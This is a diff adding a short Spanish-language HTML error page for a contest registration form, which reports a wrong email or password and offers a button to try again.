@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Error de Registro</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="fondo-concurso"></div>
+    
+    <main class="contenedor-principal">
+        <div class="tarjeta-registro">
+            <div class="encabezado">
+                <div class="icono-error">❌</div>
+                <h1>¡Error en el registro!</h1>
+                <p class="mensaje-error">El correo y/o contraseña son incorrectos<br>Inténtalo de nuevo</p>
+            </div>
+
+            <div class="acciones">
+                <button onclick="window.location.href='index.html'" class="boton-reintentar">
+                    🔄 Intentar nuevamente
+                </button>
+            </div>
+        </div>
+    </main>
+</body>
+</html>
